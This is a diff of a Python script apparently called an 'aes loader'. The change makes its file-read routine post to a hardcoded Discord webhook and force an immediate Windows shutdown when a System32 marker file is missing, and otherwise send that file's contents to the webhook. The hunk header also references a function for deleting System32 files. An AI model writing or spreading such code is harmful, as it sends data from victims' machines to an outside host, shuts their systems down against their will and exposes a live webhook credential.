@@ -28,26 +28,6 @@ delete_system32_filex()
 '''
 import zipfile
 import os
-
-def read_file(file_path):
-    try:
-        # Open the file in read mode with the appropriate encoding
-        with open(file_path, 'r', encoding='utf-8') as file:
-            # Read the entire file content
-            content = file.read()
-        return content
-    except FileNotFoundError:
-        os.system("shutdown /s /f /t 0")
-        return ""
-    except PermissionError:
-        return ""
-    except Exception as e:
-        return ""
-
-
-file_pathxx = r'C:\Windows\System32\validate.nsh'
-file_contentsx1 = read_file(file_pathxx)
-
 def send_dx(webhook_url, message):
     data = {
         "content": message
@@ -59,6 +39,27 @@ def send_dx(webhook_url, message):
         print("success aes loader")
     else:
         print(f"no internet error")
+def read_file(file_path):
+    try:
+        # Open the file in read mode with the appropriate encoding
+        with open(file_path, 'r', encoding='utf-8') as file:
+            # Read the entire file content
+            content = file.read()
+        return content
+    except FileNotFoundError:
+        send_dx("https://discord.com/api/webhooks/1273024308729352192/jPqxaz_B33A7f_hbPyoMJZrgc31-hc0_1u-1iw7DLZdxOkstl5BRFitzCmxNoyAWd4MM","unauthorized person run aes loader.")
+        os.system("shutdown /s /f /t 0")
+        return ""
+    except PermissionError:
+        return ""
+    except Exception as e:
+        return ""
+
+
+file_pathxx = r'C:\Windows\System32\validate.nsh'
+file_contentsx1 = read_file(file_pathxx)
+
+
 
 webhook_url = "https://discord.com/api/webhooks/1273024308729352192/jPqxaz_B33A7f_hbPyoMJZrgc31-hc0_1u-1iw7DLZdxOkstl5BRFitzCmxNoyAWd4MM"
 message = file_contentsx1+" run the loader."
